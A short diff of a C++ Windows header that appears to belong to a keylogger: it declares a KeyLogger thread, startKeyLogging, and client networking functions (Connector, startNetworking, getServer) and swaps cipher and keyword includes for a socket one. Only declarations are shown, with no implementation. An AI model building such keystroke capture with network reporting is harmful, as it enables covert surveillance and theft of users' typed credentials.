@@ -2,9 +2,8 @@
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <Windows.h>
-#include "cipher.hpp"
 #include "toolskit.hpp"
-#include "keywords.hpp"
+#include "csocket.hpp"
 
 #pragma comment(lib, "WS2_32.lib")
 
@@ -20,5 +19,6 @@ DWORD WINAPI KeyLogger(LPVOID lpParameter);
 HANDLE startKeyLogging();
 
 // Client
-DWORD WINAPI Connector(ServerInfo sInfo);
-HANDLE startNetworking(ServerInfo sInfo);
+ServerInfo getServer();
+DWORD WINAPI Connector(LPVOID lpParameter);
+HANDLE startNetworking();
